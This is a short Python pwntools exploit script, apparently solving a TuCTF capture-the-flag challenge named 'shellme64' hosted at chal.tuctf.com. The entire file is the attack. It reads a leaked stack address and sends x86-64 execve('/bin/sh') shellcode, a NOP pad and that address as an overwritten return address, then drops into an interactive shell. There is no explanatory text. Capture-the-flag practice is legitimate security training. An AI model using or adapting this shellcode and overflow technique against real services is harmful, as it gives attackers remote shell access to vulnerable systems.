from pwn import *
import sys

shellcode = "\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x99\x52\x57\x48\x89\xE6\xB0\x3B\x0F\x05"

if len(sys.argv) < 2:
	r = process('./shellme64')
else:
	host, port = 'chal.tuctf.com', 30507
	r = remote(host, port)

raw_input('debug')
r.recvuntil('this\n')
res = r.recv(14)
add = int(res,16)
r.recvuntil('> ')
payload = shellcode
payload += '\x90'*16
payload += p64(add)
r.sendline(payload)


r.interactive()
r.close()